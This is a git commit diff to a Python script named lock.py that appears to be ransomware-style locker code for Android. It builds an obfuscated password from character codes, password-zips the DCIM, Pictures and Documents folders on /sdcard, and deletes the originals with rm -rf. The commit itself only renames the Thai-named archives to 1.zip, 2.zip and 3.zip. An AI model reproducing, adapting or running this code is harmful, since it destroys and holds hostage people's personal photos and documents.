a2181cd6d0ec0a4a1177e3fb586cc048c86feeb5
Bell <86065111+Bell-O@users.noreply.github.com>
2021-10-10 18:35:08 +0200

    Update lock.py

--- lock.py
+++ lock.py
@@ -4,9 +4,9 @@ ps = chr(98) + chr(97) + chr(98) + chr(97) + chr(121) + chr(97) + chr(103) + chr
 
 os.system("cd")
 os.system("cd /sdcard")
-os.system("zip --password " + str(ps) + " รูปของคุน.zip DCIM")
-os.system("zip --password " + str(ps) + " รูปของคุน2.zip Pictures")
-os.system("zip --password " + str(ps) + " เอกสารของคุน.zip Documents")
+os.system("zip --password " + str(ps) + " 1.zip DCIM")
+os.system("zip --password " + str(ps) + " 2.zip Pictures")
+os.system("zip --password " + str(ps) + " 3.zip Documents")
 os.system("rm -rf DCIM")
 os.system("rm -rf Pictures")
 os.system("rm -rf Documents")
